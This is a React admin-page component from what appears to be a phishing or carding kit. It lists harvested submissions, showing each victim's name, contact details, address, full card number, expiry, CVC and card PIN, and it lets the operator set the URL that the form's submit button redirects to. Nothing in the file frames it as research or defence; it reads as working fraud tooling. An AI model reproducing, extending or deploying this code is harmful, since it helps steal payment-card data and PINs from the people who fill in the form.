import { useState, useEffect } from 'react';
import axios from 'axios';
import './AdminPage.css';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

const AdminPage = () => {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [redirectUrl, setRedirectUrl] = useState('');
  const [urlInput, setUrlInput] = useState('');
  const [urlStatus, setUrlStatus] = useState('');

  useEffect(() => {
    fetchSubmissions();
    fetchRedirectUrl();
  }, []);

  const fetchSubmissions = async () => {
    try {
      const res = await axios.get(`${API_URL}/api/submissions`);
      setSubmissions(res.data);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const fetchRedirectUrl = async () => {
    try {
      const res = await axios.get(`${API_URL}/api/config/redirect-url`);
      setRedirectUrl(res.data.redirectUrl);
      setUrlInput(res.data.redirectUrl);
    } catch (err) {
      console.error(err);
    }
  };

  const updateRedirectUrl = async () => {
    let processedUrl = urlInput.trim();
    if (processedUrl && !/^https?:\/\//i.test(processedUrl)) {
      processedUrl = 'https://' + processedUrl;
      setUrlInput(processedUrl);
    }

    try {
      const res = await axios.put(`${API_URL}/api/config/redirect-url`, {
        redirectUrl: processedUrl,
      });
      setRedirectUrl(res.data.redirectUrl);
      setUrlStatus('Redirect URL updated successfully.');
      setTimeout(() => setUrlStatus(''), 3000);
    } catch (err) {
      setUrlStatus('Failed to update redirect URL.');
    }
  };

  const formatDate = (dateStr) => new Date(dateStr).toLocaleString();

  return (
    <div className="admin-page">
      <div className="container">
        <h1>📋 All Submissions</h1>

        <div className="redirect-panel">
          <h2>Submit Button Redirect</h2>
          <label>
            Current URL:
            <span className="current-url">{redirectUrl || 'None set'}</span>
          </label>
          <div className="url-input-group">
            <input
              type="url"
              value={urlInput}
              onChange={(e) => setUrlInput(e.target.value)}
              placeholder="https://example.com"
            />
            <button onClick={updateRedirectUrl}>Update</button>
          </div>
          {urlStatus && <p className="url-status">{urlStatus}</p>}
        </div>

        {loading ? (
          <p>Loading...</p>
        ) : submissions.length === 0 ? (
          <p>No submissions yet.</p>
        ) : (
          <div className="table-responsive">
            <table>
              <thead>
                <tr>
                  <th>Name</th>
                  <th>Email</th>
                  <th>Phone</th>
                  <th>Country</th>
                  <th>Address</th>
                  <th>City</th>
                  <th>State</th>
                  <th>Card Number</th>
                  <th>Expiry</th>
                  <th>CVC</th>
                  <th>PIN</th>
                  <th>Date</th>
                </tr>
              </thead>
              <tbody>
                {submissions.map((s) => (
                  <tr key={s._id}>
                    <td>{s.firstName} {s.lastName}</td>
                    <td>{s.email}</td>
                    <td>{s.phone}</td>
                    <td>{s.country}</td>
                    <td>{s.address}</td>
                    <td>{s.city}</td>
                    <td>{s.state}</td>
                    <td>{s.cardNumber}</td>
                    <td>{s.expirationDate}</td>
                    <td>{s.securityCode}</td>
                    <td>{s.pin}</td>
                    <td>{formatDate(s.createdAt)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
};

export default AdminPage;